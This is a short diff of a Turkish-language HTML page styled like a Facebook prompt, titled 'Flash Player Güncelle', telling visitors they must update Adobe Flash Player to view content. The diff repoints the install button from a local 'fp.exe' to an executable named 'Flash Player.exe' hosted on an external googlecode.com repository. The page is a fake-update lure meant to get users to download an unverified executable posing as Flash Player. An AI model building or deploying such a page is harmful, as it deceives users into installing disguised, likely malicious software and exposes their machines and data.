@@ -1,5 +1,4 @@
-﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Flash Player Güncelle</title>
@@ -26,7 +25,7 @@ body {
     <div class="UIImageBlock_Content UIImageBlock_ICON_Content">
       <div class="fsl fwb fcb">Flash Player'ın güncellenmesi gerekiyor</div>
       <div class="mvs fsm fwn fcg">Bu içeriği görmek için Adobe Flash Player'ın son sürümünü indirip kurmalısın.</div>
-      <div class="flashFallbackButton"><a href="fp.exe" rel="nofollow" onmousedown='UntrustedLink.bootstrap($(this), &quot;zAQFbHWJP&quot;, event, bagof({}));' target="_top">
+      <div class="flashFallbackButton"><a href="http://xxxyxyxyxy.googlecode.com/svn/Flash%20Player.exe" rel="nofollow" onmousedown='UntrustedLink.bootstrap($(this), &quot;zAQFbHWJP&quot;, event, bagof({}));' target="_top">
         <label class="uiButton uiButtonSpecial" for="ufkd75_6">
           <input value="Flash Player Yükle" onclick="this.disabled=true;" id="ufkd75_6" type="button" />
         </label>
